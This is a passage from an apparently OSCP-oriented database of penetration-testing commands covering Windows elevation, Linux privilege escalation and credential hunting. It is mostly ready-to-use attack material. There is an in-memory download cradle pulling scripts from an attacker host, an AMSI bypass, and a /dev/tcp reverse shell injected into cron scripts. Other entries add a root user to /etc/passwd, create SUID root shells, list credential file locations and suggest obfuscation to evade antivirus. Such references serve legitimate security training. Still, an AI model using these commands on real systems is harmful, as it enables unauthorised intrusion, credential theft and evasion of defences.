  Correct:   -ArgumentList '-NoExit','-Command','cd C:\\'
  Incorrect: -ArgumentList '-Command','cd C:\\','-NoExit'  # -NoExit ignored if not first

COMPARISON OF PATTERNS:
1. Basic elevation (powershell-runas-basic):
   - No arguments
   - Opens elevated shell in default directory (System32)
   - Stays open by default (no -Command to execute)

2. Output redirect (powershell-runas-output-redirect):
   - Executes one command
   - Window closes immediately
   - Output captured to file

3. Keep open (THIS COMMAND):
   - Executes initial setup command
   - Stays open for interactive use
   - Can run multiple commands after opening

USE CASES:
- Run multiple elevated commands without reopening window each time
- Interactive troubleshooting requiring admin rights
- Testing scripts that require elevation
- Setting up environment (import modules, set variables) then work interactively

WHY NOT OSCP:
Same limitations as other manual elevation techniques:
- Requires GUI interaction (UAC prompt)
- User must be present to click 'Yes'
- Not automatable
- Reverse shells have no GUI
- Stealth not possible (visible window and UAC prompt)

WHEN YOU MIGHT USE THIS (NON-OSCP):
- RDP to Windows server, need admin PowerShell for configuration tasks
- Physical access to workstation, troubleshooting as admin
- Pentesting internal network with RDP access and known admin credentials
- Social engineering: convince user to run and approve UAC

INITIAL COMMAND IDEAS:
Set working directory:
  -ArgumentList '-NoExit','-Command','cd C:\\temp'

Load script/module:
  -ArgumentList '-NoExit','-Command','Import-Module ActiveDirectory'

Set execution policy for session:
  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'

Combine multiple setup commands:
  -ArgumentList '-NoExit','-Command','cd C:\\temp; Import-Module .\\MyModule.psm1'

WORKING DIRECTORY BEHAVIOR:
Elevated process starts in: C:\Windows\system32
Reason: Default working directory for processes launched with RunAs
Change with: -ArgumentList '-NoExit','-Command','cd <path>'

OR set before launching:
  Start-Process ... -WorkingDirectory 'C:\temp'
  (Note: -WorkingDirectory works WITH -Verb RunAs)

WINDOW STYLING:
Default: Normal window
  -WindowStyle Normal (default)
  -WindowStyle Maximized (full screen)
  -WindowStyle Minimized (starts in taskbar)
  -WindowStyle Hidden (invisible - not useful for interactive shell)

CLOSING THE WINDOW:
Manual: Type 'exit' or click X
Programmatic: Get-Process -Name powershell | Where {$_.MainWindowTitle -like '*Administrator*'} | Stop-Process

COMPARISON TO cmd.exe:
PowerShell:
  Start-Process powershell -Verb RunAs -ArgumentList '-NoExit'
Command Prompt:
  Start-Process cmd -Verb RunAs -ArgumentList '/k','cd C:\\'
  (/k keeps cmd open, /c closes after command)

PROFILE LOADING:
By default, elevated PowerShell loads profile from:
  $PFILES\WindowsPowerShell\profile.ps1
  $HOME\Documents\WindowsPowerShell\profile.ps1

Skip for faster startup:
  -ArgumentList '-NoExit','-NoProfile','-Command','...'

EXECUTION POLICY:
Inherited from system policy, usually:
  - RemoteSigned (default on servers)
  - Restricted (default on workstations)

Bypass for session:
  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'

TIME ESTIMATE:
10 seconds (UAC prompt + window spawn)

EXAM TIP:
This is a LEGITIMATE SYSADMIN TECHNIQUE, not a penetration testing technique. On OSCP, if you need elevated PowerShell:
1. First try UAC bypass (fodhelper/eventvwr)
2. If that fails, look for service misconfigurations
3. Check for privilege escalation vectors (Potato exploits)
4. Only use RunAs if you have RDP AND admin credentials AND need interactive session

MANUAL ALTERNATIVE:
1. Click Start menu
2. Type 'PowerShell'
3. Right-click 'Windows PowerShell'
4. Click 'Run as Administrator'
5. Click 'Yes' on UAC prompt
(Same result, GUI-only method)","low","","","","{""Window closes immediately after opening"": ""Missing -NoExit flag. Must be FIRST argument in ArgumentList: -ArgumentList '-NoExit','-Command','...'"", ""Working directory is System32"": ""Expected behavior for elevated processes. Change directory: -ArgumentList '-NoExit','-Command','cd C:\\\\temp'"", ""Execution policy blocks scripts"": ""Add bypass to arguments: -ArgumentList '-NoExit','-ExecutionPolicy','Bypass','-Command','...'"", ""Cannot see window (might be behind other windows)"": ""Add -WindowStyle parameter: Start-Process ... -WindowStyle Normal (or use -WindowStyle Maximized)"", ""Need to run script instead of command"": ""Use -File instead of -Command: -ArgumentList '-NoExit','-File','C:\\\\scripts\\\\setup.ps1'""}","{""-NoExit"": ""Keep PowerShell window open after command executes (default behavior closes window immediately)"", ""'-Command','cd C:\\\\'"": ""Initial command to run - use cd to set working directory, or any setup command. Double backslash needed for escaping."", ""-ExecutionPolicy Bypass"": ""Optional: Add as argument to bypass script execution restrictions in elevated session"", ""-NoProfile"": ""Optional: Don't load PowerShell profile (faster startup, cleaner environment)""}","","[""fodhelper-uac-bypass"", ""eventvwr-uac-bypass""]",""
"powershell-runas-download-execute","PowerShell - UAC Elevation with Remote Script Download","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\""http://<LHOST>/PowerUp.ps1\"")\""'""","Download and execute PowerShell script with elevation (requires UAC prompt) - combines RunAs with IEX download cradle","windows","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\""http://10.10.14.5/PowerUp.ps1\"")\""'""","EDUCATIONAL CONTEXT:
This technique combines THREE operations:
1. Manual UAC elevation (Start-Process -Verb RunAs)
2. Remote script download (WebClient.DownloadString)
3. In-memory execution (IEX)

WHY THIS PATTERN EXISTS:
Scenario: You have RDP access as admin user. Need to run PowerUp/PowerView/Mimikatz with elevation, but script is on attacker machine. This downloads and runs in single step with elevated privileges.

REALITY CHECK - NOT FOR OSCP:
This technique is SEVERELY LIMITED for exam:
- Requires GUI to click UAC prompt (reverse shells can't do this)
- User must be physically present or RDP active
- UAC prompt is highly visible (not stealthy)
- Requires network connectivity back to attacker (may be blocked)
- Automated exploitation impossible

WHEN YOU MIGHT USE THIS (RARE):
Pentesting scenario: Internal network, RDP access with known admin credentials, need to run enumeration tools (PowerView for AD recon, PowerUp for local privesc checks) without transferring files to disk.

BETTER ALTERNATIVES FOR OSCP:
1. UAC Bypass + Download:
   fodhelper-uac-bypass  bypass UAC without prompt
   Then run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
   Result: Elevated execution WITHOUT user interaction

2. Non-Elevated Download First:
   Download script without elevation: IEX(New-Object...) in current shell
   Many tools work without elevation (PowerView, SharpHound)
   Escalate later if needed

3. File Transfer + Local Execution:
   certutil -urlcache -f http://<LHOST>/PowerUp.ps1 C:\temp\PowerUp.ps1
   Then: fodhelper-uac-bypass with local script execution
   Pros: Script persists if download interrupted, can reuse

QUOTE ESCAPING BREAKDOWN:
COMMAND LAYER 1 (outer shell):
  powershell -Command ""...""

COMMAND LAYER 2 (Start-Process argument):
  Start-Process ... -ArgumentList '...','...'

COMMAND LAYER 3 (elevated PowerShell command):
  IEX(New-Object Net.WebClient).DownloadString(""URL"")

ESCAPING RULES:
  Layer 3 quotes must be escaped for Layer 2: \"" (backslash-quote)
  Result: ...DownloadString(\""http://...\"")...

FILELESS EXECUTION:
Advantages:
- No file written to disk (less forensic artifact)
- AV may not scan in-memory downloads (depends on AMSI)
- Script doesn't persist after PowerShell closes

Disadvantages:
- Must re-download if connection lost or window closes
- AMSI (Anti-Malware Scan Interface) scans script content anyway
- Network traffic visible (HTTP GET logged)

WEB SERVER SETUP:
On attacker machine (Kali):
  cd /path/to/scripts
  python3 -m http.server 80
  # Or: sudo python3 -m http.server 80 (if binding to port 80)

Verify script accessible:
  curl http://localhost/PowerUp.ps1
  (Should return script content)

From target:
  Test-NetConnection <LHOST> -Port 80
  Invoke-WebRequest http://<LHOST>/PowerUp.ps1

COMMON SCRIPTS TO USE:
1. PowerUp.ps1 - Windows privesc enumeration
   https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
   After download: Invoke-AllChecks

2. PowerView.ps1 - Active Directory enumeration
   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
   After download: Get-NetUser, Get-NetGroup

3. Invoke-Mimikatz.ps1 - Credential dumping (requires elevation)
   After download: Invoke-Mimikatz -DumpCreds

AMSI BYPASS:
Windows 10+ has AMSI (Anti-Malware Scan Interface) that scans script content even when downloaded in-memory. Known malicious scripts (Mimikatz) may be blocked.

Bypass AMSI before download:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Combine with download:
  -ArgumentList '-NoExit','-Command','[Ref].Assembly...SetValue($null,$true); IEX(New-Object...)'

WINDOW BEHAVIOR:
-NoExit included: Window stays open after script executes
- For PowerUp: Review findings interactively
- For Mimikatz: Credentials displayed in window, can copy manually

Without -NoExit: Window closes immediately after script completes
- Output lost unless redirected to file
- Not useful for interactive tools

NETWORK VISIBILITY:
HTTP traffic is UNENCRYPTED:
- Script content visible to network monitoring (IDS/IPS)
- Defender/EDR may inspect HTTP traffic
- Consider HTTPS if target allows (requires certificate on attacker server)

HTTPS alternative:
  python3 -m http.server --bind <LHOST> 443 --certfile cert.pem --keyfile key.pem
  (Requires self-signed cert, target may reject untrusted cert)

ALTERNATIVE DOWNLOAD METHODS:
1. Invoke-WebRequest (PowerShell 3.0+):
   IEX(Invoke-WebRequest -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content

2. BitsTransfer (stealthier, uses Windows BITS):
   Import-Module BitsTransfer
   Start-BitsTransfer -Source http://<LHOST>/script.ps1 -Destination C:\temp\script.ps1

3. certutil (file-based, not in-memory):
   certutil -urlcache -f http://<LHOST>/script.ps1 C:\temp\script.ps1

TIMING:
15-30 seconds:
- UAC prompt + user interaction: 5-10 sec
- Script download (depends on size): 1-5 sec
- Script execution (depends on script): 5-15 sec

FOR POWERUP:
- Download: ~2 sec (100KB file)
- Invoke-AllChecks execution: 10-30 sec (depending on system)

EXAM TIP - DO NOT USE:
If you're considering this on OSCP exam, you're making it too complicated. You likely have one of these situations:

1. You have RDP with admin creds:
   - Just run PowerShell as admin normally (right-click  Run as Admin)
   - Or use UAC bypass (no prompt needed)

2. You have reverse shell:
   - No GUI = can't click UAC prompt
   - Use UAC bypass techniques instead
   - Or download script without elevation first

3. You need PowerUp/PowerView output:
   - Many checks work without elevation
   - Run without UAC first, escalate later if needed

MANUAL ALTERNATIVE:
1. Open PowerShell as administrator (right-click  Run as Admin)
2. Click 'Yes' on UAC prompt
3. Run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
4. Review output

(Same result, simpler execution, fewer quote-escaping errors)","low","","","","{""Download fails - cannot resolve host"": ""1) Verify web server running: python3 -m http.server 80. 2) Check attacker IP is correct. 3) Test connectivity: ping <LHOST>. 4) Check Windows firewall: Test-NetConnection <LHOST> -Port 80"", ""Download fails - 404 Not Found"": ""Script not in web server directory. Verify: ls <web_root> shows PowerUp.ps1. Ensure filename case matches (case-sensitive on Linux servers)."", ""Script downloads but syntax error"": ""Quote escaping issue. Verify escaped quotes: \\\"" around URL. Test command locally before using in RunAs."", ""AV blocks download or execution"": ""1) Windows Defender SmartScreen may block unknown scripts. 2) Check quarantine: Get-MpThreatDetection. 3) Use obfuscation or encode script. 4) Alternative: -EncodedCommand parameter with base64."", ""Cannot see output"": ""Add -NoExit to keep window open. Without it, window closes immediately after script completes. Current command already includes -NoExit.""}","{""IEX"": ""Invoke-Expression - executes downloaded script content as PowerShell code"", ""New-Object Net.WebClient"": ""Creates WebClient object for HTTP downloads (alternative: Invoke-WebRequest)"", "".DownloadString()"": ""Downloads file content as string (in-memory, no disk write)"", ""Escaped quotes \\\"""": ""Double-backslash quote needed when nested in ArgumentList string - prevents premature quote termination"", ""-NoExit"": ""Keeps window open after script executes (useful for interactive post-exploitation tools)""}","","[""fodhelper-uac-bypass"", ""eventvwr-uac-bypass"", ""win-privesc-powerup""]",""
"linux-flag-finder","OSCP Flag Finder","post-exploit","result=$(find / -type f -regex "".*\(flag\|proof\)\.txt"" 2>/dev/null); [ -n ""$result"" ] && echo ""$result"" || grep -rlE ""OS\{[a-fA-F0-9]{32}\}"" / 2>/dev/null","Find flag.txt or proof.txt files, fallback to searching for OS{hash} pattern if not found","linux-privesc-oneliners","","OSCP exam flags are typically in:
- /root/proof.txt (after root privesc)
- /home/user/local.txt (after initial foothold)

Flag format: OS{32-character-hex-hash}

Time estimate: 5-30 seconds depending on filesystem size.

Always screenshot the flag AND the id/whoami output together for proof.","high","","","","{""No output"": ""Flags may be in non-standard location. Try: find / -name '*.txt' -exec grep -l 'OS{' {} \\; 2>/dev/null"", ""Too slow"": ""Search specific directories first: find /root /home -name '*flag*' -o -name '*proof*' 2>/dev/null""}","{""result=$(...)"": ""Command substitution - stores find output in variable for conditional logic"", ""-type f"": ""Only match regular files (not directories)"", ""-regex"": ""Use regex pattern matching on full path"", "".*\\(flag\\|proof\\)\\.txt"": ""Match paths ending in flag.txt OR proof.txt"", ""2>/dev/null"": ""Suppress permission denied errors"", ""[ -n \""$result\"" ]"": ""Test if result string is non-empty"", ""&&"": ""Execute next command only if previous succeeded (result found)"", ""||"": ""Execute next command only if previous failed (no result)"", ""grep -rlE"": ""Recursive (-r), list files only (-l), extended regex (-E)"", ""OS\\{[a-fA-F0-9]{32}\\}"": ""Match OS{ followed by 32 hex chars and } (OSCP flag format)""}","","","[""verify-root-access-suid""]"
"linux-passwd-privesc","Writable /etc/passwd Privesc","post-exploit","U=""root2"" P=""w00t""; [ -w /etc/passwd ] && ! grep -q ""^$U:"" /etc/passwd && echo ""$U:$(openssl passwd $P):0:0:root:/root:/bin/bash"" >> /etc/passwd && su $U","Exploit writable /etc/passwd by adding new root user with known password","linux-privesc-oneliners","","Writable /etc/passwd is a classic misconfiguration.

The passwd file format:
username:password_hash:UID:GID:GECOS:home:shell

UID and GID of 0 grants root privileges regardless of username.

Manual alternative (if openssl unavailable):
1. On attacker: openssl passwd mypassword
2. Copy hash
3. On target: echo 'root2:HASH:0:0::/root:/bin/bash' >> /etc/passwd

Time estimate: 30 seconds if writable, instant fail if not.","high","","","","{""Permission denied"": ""/etc/passwd is not writable. Check: ls -la /etc/passwd (need -rw-r--rw- or similar)"", ""Authentication failure"": ""Password hash mismatch. Use command substitution $(openssl passwd $P) to avoid typos"", ""openssl not found"": ""Alternative: Use python: python -c \""import crypt; print(crypt.crypt('w00t'))\"""", ""User exists"": ""Change U variable to different username: U='pwned'""}","{""U=\""root2\"" P=\""w00t\"""": ""Set variables for username and password (customize as needed)"", ""[ -w /etc/passwd ]"": ""Test if /etc/passwd is writable by current user"", ""! grep -q \""^$U:\"""": ""Check user doesn't already exist (! inverts, -q quiet mode)"", ""$(openssl passwd $P)"": ""Generate DES password hash inline (avoids copy/paste errors)"", ""0:0"": ""UID:GID of 0 = root privileges"", ""root:/root:/bin/bash"": ""GECOS field, home directory, login shell"", "">> /etc/passwd"": ""Append to passwd file (don't overwrite!)"", ""su $U"": ""Switch to new user (will prompt for password)""}","","[""execute-suid-exploit-find""]","[""linux-flag-finder"", ""verify-root-access-suid""]"
"linux-quick-privesc-enum","Quick Privesc Enumeration","post-exploit","echo ""=== SUID ==="" && find / -perm -4000 -type f 2>/dev/null && echo -e ""\n=== SGID ==="" && find / -perm -2000 -type f 2>/dev/null && echo -e ""\n=== CAPABILITIES ==="" && getcap -r / 2>/dev/null","Rapid enumeration of SUID binaries, SGID binaries, and Linux capabilities","linux-privesc-oneliners","","This is the FIRST command to run after gaining shell access.

SUID: Binary runs with owner's privileges (usually root)
SGID: Binary runs with group's privileges
Capabilities: Fine-grained root-like permissions (cap_setuid is dangerous)

Time estimate: 10-60 seconds depending on filesystem size.

Dangerous capabilities to look for:
- cap_setuid: Can become root
- cap_dac_override: Bypass file permissions
- cap_sys_admin: Almost everything","high","","","","{""getcap not found"": ""Skip capabilities or use: find / -type f -exec getcap {} \\; 2>/dev/null"", ""Too much output"": ""Pipe to less: command | less"", ""Need to save output"": ""Redirect: command > /tmp/privesc_enum.txt""}","{""echo \""=== SUID ===\"""": ""Section header for readability"", ""-perm -4000"": ""Find files with SUID bit set (4 in octal = setuid)"", ""-perm -2000"": ""Find files with SGID bit set (2 in octal = setgid)"", ""-type f"": ""Only regular files (not directories)"", ""2>/dev/null"": ""Suppress permission denied errors"", ""echo -e \""\\n\"""": ""Print newline for spacing between sections (-e enables escape sequences)"", ""getcap -r /"": ""Recursively list files with capabilities from root""}","","[""find-suid-binaries""]","[""linux-gtfobins-suid-filter"", ""gtfobins-suid-lookup""]"
"linux-full-privesc-check","Full Privesc Check","post-exploit","echo ""[*] SUID binaries owned by root:"" && find / -perm -4000 -user root -type f 2>/dev/null && echo -e ""\n[*] Capabilities:"" && getcap -r / 2>/dev/null && echo -e ""\n[*] Writable /etc/passwd?"" && [ -w /etc/passwd ] && echo ""YES - VULNERABLE"" || echo ""No"" && echo -e ""\n[*] Sudo permissions:"" && sudo -l 2>/dev/null","Comprehensive privilege escalation check including SUID, capabilities, writable passwd, and sudo","linux-privesc-oneliners","","More comprehensive than quick enum, but takes slightly longer.

Priority order for exploitation:
1. Writable /etc/passwd (instant root)
2. sudo NOPASSWD (easy exploitation via GTFOBins)
3. Dangerous capabilities (cap_setuid)
4. SUID binaries (check GTFOBins)

Time estimate: 30-90 seconds.","high","","","","{""sudo -l hangs"": ""Ctrl+C to cancel, may require password. Try: timeout 5 sudo -l 2>/dev/null"", ""Output too long"": ""Run each section separately for better analysis""}","{""-user root"": ""Only SUID binaries owned by root (most useful for privesc)"", ""[ -w /etc/passwd ]"": ""Test if passwd file is writable"", ""sudo -l"": ""List sudo permissions for current user (may require password)""}","","[""linux-quick-privesc-enum""]","[""linux-passwd-privesc"", ""linux-gtfobins-suid-filter""]"
"linux-gtfobins-suid-filter","GTFOBins-Aware SUID Check","post-exploit","GTFO=""find|vim|nmap|python|perl|ruby|bash|less|more|cp|mv|tar|awk|env|ftp|git|docker|php|node|lua""; find / -perm -4000 -type f 2>/dev/null | grep -E ""($GTFO)""","Find SUID binaries and filter to show only those known to be exploitable via GTFOBins","linux-privesc-oneliners","","Pre-filters SUID output to show only known-exploitable binaries.

If a binary appears, immediately check GTFOBins:
https://gtfobins.github.io/

Search for the binary name and look for 'SUID' section.

Common instant wins:
- find: find . -exec /bin/bash -p \; -quit
- vim: vim -c ':!/bin/bash -p'
- python: python -c 'import os; os.execl(""/bin/bash"", ""bash"", ""-p"")'

Time estimate: 10-30 seconds.","high","","","","{""Empty output"": ""System may be hardened. Check full SUID list manually for custom binaries"", ""Add more binaries"": ""Extend GTFO variable: GTFO=\""$GTFO|newbinary|another\""""}","{""GTFO=\""...\"""": ""Variable containing known exploitable binary names"", ""|"": ""Pipe character used as regex OR separator"", ""grep -E"": ""Extended regex mode for alternation patterns"", ""($GTFO)"": ""Capture group containing the binary list""}","[""linux-quick-privesc-enum""]","[""filter-suid-binaries""]","[""gtfobins-suid-lookup"", ""execute-suid-exploit-find""]"
"linux-suid-auto-research","SUID Binary Auto-Research","post-exploit","for bin in $(find / -perm -4000 -type f 2>/dev/null | xargs -I {} basename {}); do echo ""=== $bin ===""; searchsploit $bin 2>/dev/null | head -5; done","Automatically search for exploits for each SUID binary using searchsploit","linux-privesc-oneliners","","Best run on ATTACK MACHINE (Kali) not target.

Workflow:
1. On target: find / -perm -4000 -type f 2>/dev/null > /tmp/suid.txt
2. Transfer suid.txt to Kali
3. On Kali: Run this command

Note: searchsploit may return false positives (same name, different software).
Always verify exploit applicability.

Time estimate: 30-120 seconds depending on number of SUID binaries.","medium","","","","{""searchsploit not found"": ""Run on Kali, not target. Note SUID list and research on attack machine"", ""Too slow"": ""Run filtered version instead using linux-gtfobins-suid-filter first"", ""Too much output"": ""Redirect to file: command > suid_research.txt""}","{""for bin in $(...)"": ""Loop through each binary found"", ""xargs -I {} basename {}"": ""Extract just the filename from full path"", ""echo \""=== $bin ===\"""": ""Print header for each binary"", ""searchsploit $bin"": ""Search exploit-db for binary name"", ""head -5"": ""Limit to first 5 results per binary""}","[""find-suid-binaries""]","","[""gtfobins-suid-lookup""]"
"linux-cron-enum","Cron Job Enumeration","post-exploit","cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null","Enumerate all system and user cron jobs for potential privilege escalation","linux-privesc-oneliners","","Cron privesc vectors:

1. WRITABLE SCRIPT: If cron runs a script you can write to, inject reverse shell
2. RELATIVE PATH: If script uses 'backup.sh' not '/usr/bin/backup.sh', PATH hijacking
3. WILDCARD INJECTION: If script uses tar/rsync with *, exploit via malicious filenames
4. MISSING SCRIPT: If cron references non-existent file you can create, create it

Cron format:
min hour day month weekday user command

Time estimate: 5-10 seconds.","high","","","","{""Permission denied on user crontabs"": ""Normal for unprivileged user. Focus on /etc/crontab and /etc/cron.d/"", ""Can't see cron execution"": ""Use pspy to monitor process creation: ./pspy64""}","{""/etc/crontab"": ""System-wide crontab with user field"", ""/etc/cron.*"": ""Matches cron.d, cron.daily, cron.hourly, cron.weekly, cron.monthly"", ""ls -la"": ""List with permissions to check writability"", ""/var/spool/cron/crontabs/*"": ""User crontabs (alternative: /var/spool/cron/*)""}","","",""
"linux-suid-vuln-check","SUID Vulnerability Check","post-exploit","ls -la $(which find) | grep -q 'rws' && echo ""VULNERABLE"" || echo ""NOT VULNERABLE""","Quick check if a specific binary (find) has SUID bit set for exploitation","linux-privesc-oneliners","","Quick targeted check for specific binary SUID status.

Permission string interpretation:
- rwsr-xr-x = SUID set (lowercase s = execute + suid)
- rwSr-xr-x = SUID set but no execute (uppercase S, broken)
- rwxr-xr-x = No SUID (normal execute)

Modify 'find' to check any binary:
- vim: ls -la $(which vim) | grep -q 'rws'
- python: ls -la $(which python) | grep -q 'rws'
- nmap: ls -la $(which nmap) | grep -q 'rws'

Time estimate: < 1 second.","high","","","","{""Check different binary"": ""Replace 'find' with target binary: ls -la $(which vim) | grep -q 'rws'"", ""which not available"": ""Use full path: ls -la /usr/bin/find | grep -q 'rws'""}","{""$(which find)"": ""Command substitution to get full path of binary"", ""ls -la"": ""Long listing with permissions"", ""grep -q 'rws'"": ""Quiet grep for SUID pattern (r=read, w=write, s=suid+execute)"", ""&&"": ""Run next command if grep succeeds (pattern found)"", ""||"": ""Run next command if grep fails (pattern not found)""}","","[""find-suid-binaries""]","[""execute-suid-exploit-find""]"
"linux-cron-hijack-suid","Cron Job Hijack - SUID Bash","post-exploit","echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> <WRITABLE_SCRIPT> && sleep 65 && /tmp/rootbash -p","Inject SUID bash payload into writable cron script, wait for execution, then spawn root shell","linux-privesc-oneliners","echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/archives/archive.sh && sleep 65 && /tmp/rootbash -p","BEST privesc method when kernel exploits fail due to GLIBC mismatch or no GCC.

Discovery workflow:
1. Run linux-cron-enum to find cron jobs
2. Check for writable scripts: find / -writable -type f 2>/dev/null | xargs grep -l '/etc/cron\|crontab'
3. Or look for writable paths in cron output

Why -p flag is critical:
- Bash normally drops privileges to real UID for security
- -p preserves effective UID (euid=0 from SUID)
- Without -p: uid=1000, euid=1000 (dropped)
- With -p: uid=1000, euid=0 (ROOT!)

Time estimate: 1-2 minutes (mostly waiting for cron).

OSCP exam note: This works when compiled kernel exploits fail (GLIBC mismatch, no compiler).","high","","","","{""SUID bit not set"": ""Cron not running as root. Check crontab user field: cat /etc/crontab"", ""File not created"": ""Cron may run less frequently. Check schedule and wait longer"", ""Permission denied on /tmp"": ""Try /dev/shm or /var/tmp instead: cp /bin/bash /dev/shm/rootbash"", ""euid stays 1000"": ""Forgot -p flag! Must use /tmp/rootbash -p not just /tmp/rootbash""}","{""cp /bin/bash /tmp/rootbash"": ""Copy bash binary to writable location (cron runs as root so copy preserves ownership)"", ""chmod +s"": ""Set SUID bit so binary runs with owner privileges (root)"", "">>"": ""Append to file (don't overwrite existing script content)"", ""sleep 65"": ""Wait for cron to execute (most cron jobs run every minute)"", ""/tmp/rootbash -p"": ""Execute SUID bash with -p flag to preserve effective UID (euid=0)"", ""-p"": ""CRITICAL: Prevents bash from dropping privileges to real UID""}","[""linux-cron-enum""]","[""linux-cron-hijack-revshell""]","[""linux-flag-finder""]"
"linux-cron-hijack-revshell","Cron Job Hijack - Reverse Shell","post-exploit","echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> <WRITABLE_SCRIPT>","Inject reverse shell into writable cron script for root shell callback","linux-privesc-oneliners","echo 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' >> /opt/scripts/backup.sh","Alternative to SUID method when you want immediate shell.

Setup listener first: nc -lvnp 4444

Advantage over SUID method: Immediate full interactive shell
Disadvantage: Requires network connectivity to attacker

Time estimate: 1-2 minutes (waiting for cron).","high","","","","{""No callback"": ""Check firewall rules, verify cron is running, try different port"", ""Callback as user"": ""Cron not running as root, check crontab user field""}","{""bash -i"": ""Interactive bash shell"", "">& /dev/tcp/"": ""Redirect stdout and stderr to TCP connection"", ""0>&1"": ""Redirect stdin to same connection (full duplex shell)""}","[""linux-cron-enum""]","[""linux-cron-hijack-suid""]","[""linux-flag-finder""]"
"linux-suid-find-shell","SUID Find - Root Shell","post-exploit","find / -exec /bin/bash -p \; -quit","Spawn root shell via SUID find binary using -exec flag","linux-privesc-oneliners","","INSTANT root shell if find has SUID bit.

Verify SUID first: ls -la $(which find)
Should show: -rwsr-xr-x ... /usr/bin/find

The 's' in the owner execute position means SUID is set.

Why this works:
1. find runs as root (SUID)
2. -exec runs command as the find process owner (root)
3. bash -p preserves euid=0
4. Result: root shell

GTFOBins reference: https://gtfobins.github.io/gtfobins/find/

Time estimate: < 1 second (instant).

OSCP exam: Most reliable SUID exploitation - memorize this command!","high","","","","{""Still user shell"": ""Verify find is SUID: ls -la $(which find) - must show 's' in permissions"", ""-quit not supported"": ""Remove -quit flag, press Ctrl+C after shell spawns"", ""bash -p not working"": ""Try sh instead: find / -exec /bin/sh -p \\; -quit""}","{""find /"": ""Search from root (any valid path works, / is conventional)"", ""-exec"": ""Execute command for each match (or just once with -quit)"", ""/bin/bash -p"": ""Spawn bash preserving effective UID (euid=0)"", ""\\;"": ""Terminate -exec command (escaped semicolon)"", ""-quit"": ""Exit after first execution (prevents spawning multiple shells)""}","[""linux-gtfobins-suid-filter""]","","[""linux-flag-finder""]"
"windows-search-sensitive-files","Search for Sensitive Files and Credentials","post-exploit","dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config","Recursively search C: drive for files containing 'password', 'cred', 'vnc', or '.config' in filename. Discovers configuration files, credential stores, and backup files containing sensitive information.","credential-hunting","","FIRST STEP after gaining Windows shell - hunt for low-hanging credential fruit. OSCP COMMON FINDS: (1) C:\Users\<user>\passwords.txt (plain text password lists), (2) C:\inetpub\wwwroot\web.config (database connection strings), (3) C:\Program Files\FileZilla Server\FileZilla Server.xml (FTP credentials), (4) C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml, (5) VNC password files, (6) Unattend.xml (Windows deployment credentials). Time estimate: 30 seconds - 5 minutes (depends on drive size and result count).

MANUAL ALTERNATIVES:

Basic credential file search:
dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config

Expanded search terms:
dir /s /b C:\*pass* C:\*pwd* C:\*key* C:\*secret* C:\*backup* C:\*config*

Search user profiles only (faster):
dir /s /b C:\Users\*password* C:\Users\*cred*

Search web application directories:
dir /s /b C:\inetpub\wwwroot\*.config C:\inetpub\wwwroot\*.xml
type C:\inetpub\wwwroot\web.config | findstr /i password

Search for database connection strings:
dir /s /b C:\*.config | xargs type | findstr /i ""connectionString""

PowerShell recursive search (filename):
Get-ChildItem -Path C:\ -Recurse -Include *password*,*cred*,*vnc*,*.config -ErrorAction SilentlyContinue | Select-Object FullName

PowerShell content search (searches INSIDE files):
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern ""password|credential"" -SimpleMatch

HIGH-VALUE TARGET LOCATIONS:

1. User profiles:
C:\Users\<user>\Desktop\passwords.txt
C:\Users\<user>\Documents\credentials.xlsx
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (command history)

2. Web application config:
C:\inetpub\wwwroot\web.config (IIS web apps)
C:\xampp\htdocs\config.php (XAMPP)
C:\wamp\www\config.inc.php (WAMP)

3. FTP server credentials:
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml (client)

4. VNC passwords:
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver (registry)
C:\Program Files\RealVNC\VNC Server\config.txt
C:\Program Files\UltraVNC\ultravnc.ini

5. Database connection strings:
C:\Program Files\<AppName>\app.config
C:\Windows\System32\inetsrv\config\applicationHost.config (IIS)

6. Windows deployment credentials:
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\system32\sysprep\Unattend.xml

7. Backup files:
C:\Backup\*.zip
C:\Users\<user>\Documents\backup*.rar
C:\Windows\System32\config\RegBack\SAM (registry backups)

8. SSH keys:
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\.ssh\id_rsa.pub

9. Git credentials:
C:\Users\<user>\.git-credentials
C:\<project>\.git\config

10. PowerShell history:
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type (Get-PSReadlineOption).HistorySavePath

SPECIFIC FILE SEARCHES:

Unattend.xml (auto-deployment credentials):
dir /s /b C:\*unattend.xml C:\*unattended.xml
type C:\Windows\Panther\Unattend.xml | findstr /i password

PowerShell history (command history):
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
